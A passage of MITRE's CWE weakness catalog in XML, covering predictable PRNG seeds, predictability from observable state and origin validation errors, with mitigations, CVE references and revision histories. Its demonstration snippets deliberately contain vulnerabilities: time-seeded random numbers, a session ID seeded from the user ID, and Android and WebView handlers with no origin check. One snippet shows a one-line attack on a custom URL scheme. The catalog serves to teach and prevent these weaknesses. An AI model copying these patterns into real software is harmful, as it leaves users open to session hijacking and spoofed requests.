	   communities, "randomness" is used heavily. However, within
	   cryptography, "entropy" is distinct, typically implied as a
	   measurement. There are no commonly-used definitions, even within
	   standards documents and cryptography papers. Future versions of
	   CWE will attempt to define these terms and, if necessary,
	   distinguish between them in ways that are appropriate for
	   different communities but do not reduce the usability of CWE for
	   mapping, understanding, or other scenarios.</Note>
	 </Notes>
         <Content_History>
            <Submission>
               <Submission_Name>PLOVER</Submission_Name>
               <Submission_Date>2006-07-19</Submission_Date>
               <Submission_Version>Draft 3</Submission_Version>
               <Submission_ReleaseDate>2006-07-19</Submission_ReleaseDate>
            </Submission>
            <Modification>
               <Modification_Name>Sean Eidemiller</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>added/updated demonstrative examples</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>Eric Dalci</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>updated Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-03-10</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-12-28</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-06-21</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-09-13</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations, References</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Description, Modes_of_Introduction, Name, References, Relationships</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-01-03</Modification_Date>
					<Modification_Comment>updated Relationships, Taxonomy_Mappings</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-06-20</Modification_Date>
					<Modification_Comment>updated Type</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-07-20</Modification_Date>
					<Modification_Comment>updated Demonstrative_Examples, Description, Maintenance_Notes, Modes_of_Introduction, Potential_Mitigations, References</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-04-27</Modification_Date>
					<Modification_Comment>updated Detection_Factors, Modes_of_Introduction, References, Relationships, Time_of_Introduction</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-06-29</Modification_Date>
					<Modification_Comment>updated Mapping_Notes, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-10-26</Modification_Date>
					<Modification_Comment>updated Demonstrative_Examples, Observed_Examples</Modification_Comment>
				</Modification>
            <Previous_Entry_Name Date="2017-11-08">Same Seed in PRNG</Previous_Entry_Name>
         </Content_History>
      </Weakness>
      <Weakness ID="337" Name="Predictable Seed in Pseudo-Random Number Generator (PRNG)" Abstraction="Variant" Structure="Simple" Status="Draft">
         <Description>A Pseudo-Random Number Generator (PRNG) is initialized from a predictable seed, such as the process ID or system time.</Description>
         <Extended_Description>The use of predictable seeds significantly reduces the number of possible seeds that an attacker would need to test in order to predict which random numbers will be generated by the PRNG.</Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="335" View_ID="1000" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Applicable_Platforms>
            <Language Class="Not Language-Specific" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
               <Note>REALIZATION: This weakness is caused during implementation of an architectural security tactic.</Note>
            </Introduction>
         </Modes_Of_Introduction>
         <Common_Consequences>
            <Consequence>
               <Scope>Other</Scope>
               <Impact>Varies by Context</Impact>
            </Consequence>
         </Common_Consequences>
         <Potential_Mitigations>
            <Mitigation>
               <Description>Use non-predictable inputs for seed generation.</Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-2">
               <Phase>Architecture and Design</Phase>
               <Phase>Requirements</Phase>
               <Strategy>Libraries or Frameworks</Strategy>
               <Description>Use products or modules that conform to FIPS 140-2 [REF-267] to avoid obvious entropy problems, or use the more recent FIPS 140-3 [REF-1192] if possible.</Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-50">
               <Phase>Implementation</Phase>
               <Description>Use a PRNG that periodically re-seeds itself using input from high-quality sources, such as hardware devices with high entropy. However, do not re-seed too frequently, or else the entropy source might block.</Description>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example Demonstrative_Example_ID="DX-102">
               <Intro_Text>Both of these examples use a statistical PRNG seeded with the current value of the system clock to generate a random number:</Intro_Text>
               <Example_Code Nature="Bad" Language="Java">
                  <xhtml:div>Random random = new Random(System.currentTimeMillis());<xhtml:br/>int accountID = random.nextInt();</xhtml:div>
               </Example_Code>
               <Example_Code Nature="Bad" Language="C">
                  <xhtml:div>srand(time());<xhtml:br/>int randNum = rand();</xhtml:div>
               </Example_Code>
               <Body_Text>An attacker can easily predict the seed used by these PRNGs, and so also predict the stream of random numbers generated. Note these examples also exhibit CWE-338 (Use of Cryptographically Weak PRNG).</Body_Text>
            </Demonstrative_Example>
         </Demonstrative_Examples>
		 <Observed_Examples>
         <Observed_Example>
            <Reference>CVE-2020-7010</Reference>
            <Description>Cloud application on Kubernetes generates passwords using a weak random number generator based on deployment time.</Description>
            <Link>https://www.cve.org/CVERecord?id=CVE-2020-7010</Link>
         </Observed_Example>
		   <Observed_Example>
			 <Reference>CVE-2019-11495</Reference>
			 <Description>server uses erlang:now() to seed the PRNG, which
			 results in a small search space for potential random
			 seeds</Description>
			 <Link>https://www.cve.org/CVERecord?id=CVE-2019-11495</Link>
		   </Observed_Example>
		   <Observed_Example>
			 <Reference>CVE-2008-0166</Reference>
			 <Description>The removal of a couple lines of code caused Debian's OpenSSL Package to only use the current process ID for seeding a PRNG</Description>
			 <Link>https://www.cve.org/CVERecord?id=CVE-2008-0166</Link>
		   </Observed_Example>
		   <Observed_Example>
			 <Reference>CVE-2016-10180</Reference>
			 <Description>Router's PIN generation is based on rand(time(0)) seeding.</Description>
			 <Link>https://www.cve.org/CVERecord?id=CVE-2016-10180</Link>
		   </Observed_Example>
		   <Observed_Example>
			 <Reference>CVE-2018-9057</Reference>
			 <Description>cloud provider product uses a non-cryptographically secure PRNG and seeds it with the current time</Description>
			 <Link>https://www.cve.org/CVERecord?id=CVE-2018-9057</Link>
		   </Observed_Example>
		 </Observed_Examples>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="PLOVER">
               <Entry_Name>Predictable Seed in PRNG</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="The CERT Oracle Secure Coding Standard for Java (2011)">
               <Entry_ID>MSC02-J</Entry_ID>
               <Entry_Name>Generate strong random numbers</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <References>
            <Reference External_Reference_ID="REF-267" Section="Annex C, Approved Random Number Generators"/>
            <Reference External_Reference_ID="REF-1192"/>
            <Reference External_Reference_ID="REF-44" Section="&#34;Sin 20: Weak Random Numbers.&#34; Page 299"/>
         </References>
         <Mapping_Notes>
            <Usage>Allowed</Usage>
            <Rationale>This CWE entry is at the Variant level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.</Rationale>
            <Comments>Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.</Comments>
            <Reasons>
               <Reason Type="Acceptable-Use"/>
            </Reasons>
         </Mapping_Notes>
	 <Notes>
	   <Note Type="Maintenance">As of CWE 4.5, terminology related to randomness, entropy, and
	   predictability can vary widely. Within the developer and other
	   communities, "randomness" is used heavily. However, within
	   cryptography, "entropy" is distinct, typically implied as a
	   measurement. There are no commonly-used definitions, even within
	   standards documents and cryptography papers. Future versions of
	   CWE will attempt to define these terms and, if necessary,
	   distinguish between them in ways that are appropriate for
	   different communities but do not reduce the usability of CWE for
	   mapping, understanding, or other scenarios.</Note>
	 </Notes>
         <Content_History>
            <Submission>
               <Submission_Name>PLOVER</Submission_Name>
               <Submission_Date>2006-07-19</Submission_Date>
               <Submission_Version>Draft 3</Submission_Version>
               <Submission_ReleaseDate>2006-07-19</Submission_ReleaseDate>
            </Submission>
            <Modification>
               <Modification_Name>Sean Eidemiller</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>added/updated demonstrative examples</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>Eric Dalci</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>updated Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-03-10</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-12-28</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-06-21</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-27</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-09-13</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations, References</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated References, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-10-30</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Demonstrative_Examples, Description, Modes_of_Introduction, Name, References, Relationships</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-01-03</Modification_Date>
					<Modification_Comment>updated Relationships, Taxonomy_Mappings</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-06-20</Modification_Date>
					<Modification_Comment>updated Type</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated Description, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-07-20</Modification_Date>
					<Modification_Comment>updated Maintenance_Notes, Observed_Examples, Potential_Mitigations, References</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-10-13</Modification_Date>
					<Modification_Comment>updated Observed_Examples</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-04-27</Modification_Date>
					<Modification_Comment>updated References, Relationships, Time_of_Introduction</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-06-29</Modification_Date>
					<Modification_Comment>updated Mapping_Notes, Relationships</Modification_Comment>
				</Modification>
            <Previous_Entry_Name Date="2017-11-08">Predictable Seed in PRNG</Previous_Entry_Name>
         </Content_History>
      </Weakness>
      <Weakness ID="341" Name="Predictable from Observable State" Abstraction="Base" Structure="Simple" Status="Draft">
         <Description>A number or object is predictable based on observations that the attacker can make about the state of the system or network, such as time, process ID, etc.</Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="340" View_ID="1000" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Applicable_Platforms>
            <Language Class="Not Language-Specific" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
            </Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
               <Note>REALIZATION: This weakness is caused during implementation of an architectural security tactic.</Note>
            </Introduction>
         </Modes_Of_Introduction>
         <Common_Consequences>
            <Consequence>
               <Scope>Other</Scope>
               <Impact>Varies by Context</Impact>
               <Note>This weakness could be exploited by an attacker in a number ways depending on the context. If a predictable number is used to generate IDs or keys that are used within protection mechanisms, then an attacker could gain unauthorized access to the system. If predictable filenames are used for storing sensitive information, then an attacker might gain access to the system and may be able to gain access to the information in the file.</Note>
            </Consequence>
         </Common_Consequences>
         <Potential_Mitigations>
            <Mitigation>
               <Phase>Implementation</Phase>
               <Description>Increase the entropy used to seed a PRNG.</Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-2">
               <Phase>Architecture and Design</Phase>
               <Phase>Requirements</Phase>
               <Strategy>Libraries or Frameworks</Strategy>
               <Description>Use products or modules that conform to FIPS 140-2 [REF-267] to avoid obvious entropy problems. Consult FIPS 140-2 Annex C ("Approved Random Number Generators").</Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-50">
               <Phase>Implementation</Phase>
               <Description>Use a PRNG that periodically re-seeds itself using input from high-quality sources, such as hardware devices with high entropy. However, do not re-seed too frequently, or else the entropy source might block.</Description>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example Demonstrative_Example_ID="DX-45">
               <Intro_Text>This code generates a unique random identifier for a user's session.</Intro_Text>
               <Example_Code Nature="Bad" Language="PHP">
                  <xhtml:div>function generateSessionID($userID){<xhtml:div style="margin-left:1em;">srand($userID);<xhtml:br/>return rand();</xhtml:div>}</xhtml:div>
               </Example_Code>
               <Body_Text>Because the seed for the PRNG is always the user's ID, the session ID will always be the same. An attacker could thus predict any user's session ID and potentially hijack the session.</Body_Text>
               <Body_Text>This example also exhibits a Small Seed Space (CWE-339).</Body_Text>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-2002-0389</Reference>
               <Description>Mail server stores private mail messages with predictable filenames in a world-executable directory, which allows local users to read private mailing list archives.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2002-0389</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2001-1141</Reference>
               <Description>PRNG allows attackers to use the output of small PRNG requests to determine the internal state information, which could be used by attackers to predict future pseudo-random numbers.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2001-1141</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2000-0335</Reference>
               <Description>DNS resolver library uses predictable IDs, which allows a local attacker to spoof DNS query results.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2000-0335</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-1636</Reference>
               <Description>MFV. predictable filename and insecure permissions allows file modification to execute SQL queries.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2005-1636</Link>
            </Observed_Example>
         </Observed_Examples>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="PLOVER">
               <Entry_Name>Predictable from Observable State</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <References>
            <Reference External_Reference_ID="REF-267"/>
            <Reference External_Reference_ID="REF-44" Section="&#34;Sin 20: Weak Random Numbers.&#34; Page 299"/>
         </References>
         <Mapping_Notes>
            <Usage>Allowed</Usage>
            <Rationale>This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.</Rationale>
            <Comments>Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.</Comments>
            <Reasons>
               <Reason Type="Acceptable-Use"/>
            </Reasons>
         </Mapping_Notes>
	 <Notes>
	   <Note Type="Maintenance">As of CWE 4.5, terminology related to randomness, entropy, and
	   predictability can vary widely. Within the developer and other
	   communities, "randomness" is used heavily. However, within
	   cryptography, "entropy" is distinct, typically implied as a
	   measurement. There are no commonly-used definitions, even within
	   standards documents and cryptography papers. Future versions of
	   CWE will attempt to define these terms and, if necessary,
	   distinguish between them in ways that are appropriate for
	   different communities but do not reduce the usability of CWE for
	   mapping, understanding, or other scenarios.</Note>
	 </Notes>
         <Content_History>
            <Submission>
               <Submission_Name>PLOVER</Submission_Name>
               <Submission_Date>2006-07-19</Submission_Date>
               <Submission_Version>Draft 3</Submission_Version>
               <Submission_ReleaseDate>2006-07-19</Submission_ReleaseDate>
            </Submission>
            <Modification>
               <Modification_Name>Eric Dalci</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>updated Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-03-10</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-12-28</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-06-21</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-27</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-09-13</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations, References</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Demonstrative_Examples, Observed_Examples, References, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-10-30</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Modes_of_Introduction, References, Relationships</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-07-20</Modification_Date>
					<Modification_Comment>updated Maintenance_Notes</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-04-27</Modification_Date>
					<Modification_Comment>updated References, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-06-29</Modification_Date>
					<Modification_Comment>updated Mapping_Notes, Relationships</Modification_Comment>
				</Modification>
         </Content_History>
      </Weakness>
      <Weakness ID="346" Name="Origin Validation Error" Abstraction="Class" Structure="Simple" Status="Draft">
         <Description>The product does not properly verify that the source of data or communication is valid.</Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="345" View_ID="1000" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="345" View_ID="1003" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="284" View_ID="1000"/>
         </Related_Weaknesses>
         <Weakness_Ordinalities>
            <Weakness_Ordinality>
               <Ordinality>Primary</Ordinality>
            </Weakness_Ordinality>
            <Weakness_Ordinality>
               <Ordinality>Resultant</Ordinality>
            </Weakness_Ordinality>
         </Weakness_Ordinalities>
         <Applicable_Platforms>
            <Language Class="Not Language-Specific" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
            </Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
               <Note>REALIZATION: This weakness is caused during implementation of an architectural security tactic.</Note>
            </Introduction>
         </Modes_Of_Introduction>
         <Common_Consequences>
            <Consequence>
               <Scope>Access Control</Scope>
               <Scope>Other</Scope>
               <Impact>Gain Privileges or Assume Identity</Impact>
               <Impact>Varies by Context</Impact>
               <Note>An attacker can access any functionality that is inadvertently accessible to the source.</Note>
            </Consequence>
         </Common_Consequences>
         <Demonstrative_Examples>
            <Demonstrative_Example Demonstrative_Example_ID="DX-112">
               <Intro_Text>This Android application will remove a user account when it receives an intent to do so:</Intro_Text>
               <Example_Code Nature="Bad" Language="Java">
                  <xhtml:div>IntentFilter filter = new IntentFilter("com.example.RemoveUser");<xhtml:br/>MyReceiver receiver = new MyReceiver();<xhtml:br/>registerReceiver(receiver, filter);<xhtml:br/>
                     <xhtml:br/>public class DeleteReceiver extends BroadcastReceiver {<xhtml:div style="margin-left:1em;">@Override<xhtml:br/>public void onReceive(Context context, Intent intent) {<xhtml:div style="margin-left:1em;">int userID = intent.getIntExtra("userID");<xhtml:br/>destroyUserData(userID);</xhtml:div>}</xhtml:div>}</xhtml:div>
               </Example_Code>
               <Body_Text>This application does not check the origin of the intent, thus allowing any malicious application to remove a user. Always check the origin of an intent, or create an allowlist of trusted applications using the manifest.xml file.</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-109">
               <Intro_Text>These Android and iOS applications intercept URL loading within a WebView and perform special actions if a particular URL scheme is used, thus allowing the Javascript within the WebView to communicate with the application:</Intro_Text>
               <Example_Code Nature="Bad" Language="Java">
                  <xhtml:div>
                     <xhtml:i>// Android</xhtml:i>
                     <xhtml:br/>@Override<xhtml:br/>public boolean shouldOverrideUrlLoading(WebView view, String url){<xhtml:div style="margin-left:1em;">
                        <xhtml:div>if (url.substring(0,14).equalsIgnoreCase("examplescheme:")){<xhtml:div style="margin-left:1em;">if(url.substring(14,25).equalsIgnoreCase("getUserInfo")){<xhtml:div style="margin-left:1em;">writeDataToView(view, UserData);<xhtml:br/>return false;</xhtml:div>}<xhtml:br/>else{<xhtml:div style="margin-left:1em;">return true;</xhtml:div>}</xhtml:div>}</xhtml:div>
                     </xhtml:div>}</xhtml:div>
               </Example_Code>
               <Example_Code Nature="Bad" Language="Objective-C">
                  <xhtml:div>
                     <xhtml:i>// iOS</xhtml:i>
                     <xhtml:br/>-(BOOL) webView:(UIWebView *)exWebView shouldStartLoadWithRequest:(NSURLRequest *)exRequest navigationType:(UIWebViewNavigationType)exNavigationType<xhtml:br/>{<xhtml:div style="margin-left:1em;">
                        <xhtml:div>NSURL *URL = [exRequest URL];<xhtml:br/>if ([[URL scheme] isEqualToString:@"exampleScheme"])<xhtml:br/>{<xhtml:div style="margin-left:1em;">
                              <xhtml:div>NSString *functionString = [URL resourceSpecifier];<xhtml:br/>if ([functionString hasPrefix:@"specialFunction"])<xhtml:br/>{<xhtml:div style="margin-left:1em;">
                                    <xhtml:div>
                                       <xhtml:br/>
                                       <xhtml:i>// Make data available back in webview.</xhtml:i>
                                       <xhtml:br/>UIWebView *webView = [self writeDataToView:[URL query]];</xhtml:div>
                                 </xhtml:div>}<xhtml:br/>return NO;</xhtml:div>
                           </xhtml:div>}<xhtml:br/>return YES;</xhtml:div>
                     </xhtml:div>}</xhtml:div>
               </Example_Code>
               <Body_Text>A call into native code can then be initiated by passing parameters within the URL:</Body_Text>
               <Example_Code Nature="Attack" Language="JavaScript">
                  <xhtml:div>window.location = examplescheme://method?parameter=value</xhtml:div>
               </Example_Code>
               <Body_Text>Because the application does not check the source, a malicious website loaded within this WebView has the same access to the API as a trusted site.</Body_Text>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-2000-1218</Reference>
               <Description>DNS server can accept DNS updates from hosts that it did not query, leading to cache poisoning</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2000-1218</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-0877</Reference>
               <Description>DNS server can accept DNS updates from hosts that it did not query, leading to cache poisoning</Description>
